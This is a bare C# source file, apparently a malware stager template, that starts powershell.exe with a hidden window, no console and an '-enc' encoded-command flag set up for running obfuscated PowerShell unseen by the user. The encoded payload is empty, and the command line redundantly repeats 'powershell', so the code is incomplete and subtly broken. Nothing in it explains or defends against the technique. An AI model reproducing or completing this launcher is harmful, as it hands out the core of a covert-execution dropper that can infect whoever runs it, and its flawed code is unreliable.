using System;
using System.Diagnostics;

class Entry
{
    static void Main()
    {
        var ps = "powershell -noP -sta -w 1 -enc ";
        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = ps,
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
